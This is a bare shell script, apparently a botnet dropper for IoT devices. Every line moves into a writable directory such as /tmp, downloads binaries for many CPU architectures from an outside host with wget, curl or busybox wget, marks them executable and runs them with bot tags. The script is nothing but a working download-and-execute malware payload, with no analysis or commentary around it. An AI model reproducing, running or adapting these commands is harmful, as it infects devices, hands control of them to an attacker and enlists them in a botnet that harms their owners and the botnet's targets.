#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/x86; curl -O http://s7.backupsuper.cc/x86;cat x86 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/mips; curl -O http://s7.backupsuper.cc/mips;cat mips >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/arc; curl -O http://s7.backupsuper.cc/arc;cat arc >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/x86_64; curl -O http://s7.backupsuper.cc/x86_64;cat x86_64 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/mpsl; curl -O http://s7.backupsuper.cc/mpsl;cat mpsl >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/arm; curl -O http://s7.backupsuper.cc/arm;cat arm >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/arm5; curl -O http://s7.backupsuper.cc/arm5;cat arm5 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/arm6; curl -O http://s7.backupsuper.cc/arm6;cat arm6 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/arm7; curl -O http://s7.backupsuper.cc/arm7;cat arm7 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/ppc; curl -O http://s7.backupsuper.cc/ppc;cat ppc >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/spc; curl -O http://s7.backupsuper.cc/spc;cat spc >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/m68k; curl -O http://s7.backupsuper.cc/m68k;cat m68k >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s7.backupsuper.cc/sh4; curl -O http://s7.backupsuper.cc/sh4;cat sh4 >gfdjgfdjsgnfdsjkgnfdsjk;chmod +x *;./gfdjgfdjsgnfdsjkgnfdsjk multi



cd /tmp; rm -rf /tmp/arm; wget http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm multi-arm
cd /tmp; rm -rf /tmp/arm5; wget http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 multi-arm5
cd /tmp; rm -rf /tmp/arm6; wget http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 multi-arm6
cd /tmp; rm -rf /tmp/arm7; wget http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 multi-arm7
cd /tmp; rm -rf /tmp/debug.dbg; wget http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg multi-debug
cd /tmp; rm -rf /tmp/m68k; wget http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k multi-m68k
cd /tmp; rm -rf /tmp/mips; wget http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips multi-mips
cd /tmp; rm -rf /tmp/ppc; wget http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc multi-ppc
cd /tmp; rm -rf /tmp/sh4; wget http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 multi-sh4
cd /tmp; rm -rf /tmp/spc; wget http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc multi-spc
cd /tmp; rm -rf /tmp/x86; wget http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 multi-x86
cd /tmp; rm -rf /tmp/x86_64; wget http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 multi-x86_64
cd /tmp; rm -rf /tmp/bot.mpsl; wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl multi_bot_mpsl


cd /tmp; rm -rf /tmp/arm;/bin/busybox wget http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm multi2-arm
cd /tmp; rm -rf /tmp/arm5;/bin/busybox wget http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 multi2-arm5
cd /tmp; rm -rf /tmp/arm6;/bin/busybox wget http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 multi2-arm6
cd /tmp; rm -rf /tmp/arm7;/bin/busybox wget http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 multi2-arm7
cd /tmp; rm -rf /tmp/debug.dbg;/bin/busybox wget http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg multi2-debug
cd /tmp; rm -rf /tmp/m68k;/bin/busybox wget http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k multi2-m68k
cd /tmp; rm -rf /tmp/mips;/bin/busybox wget http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips multi2-mips
cd /tmp; rm -rf /tmp/ppc;/bin/busybox wget http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc multi2-ppc
cd /tmp; rm -rf /tmp/sh4;/bin/busybox wget http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 multi2-sh4
cd /tmp; /bin/busybox wget http://s7.backupsuper.cc/gfdsggfdsgfdsgfds.mpsl; chmod 777 gfdsggfdsgfdsgfds.mpsl; ./gfdsggfdsgfdsgfds.mpsl rand.mpsl
cd /tmp; rm -rf /tmp/spc;/bin/busybox wget http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc multi2-spc
cd /tmp; rm -rf /tmp/x86;/bin/busybox wget http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 multi2-x86
cd /tmp; rm -rf /tmp/x86_64;/bin/busybox wget http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 multi2-x86_64
cd /tmp; rm -rf /tmp/bot.mpsl;/bin/busybox wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl multi2_bot_mpsl
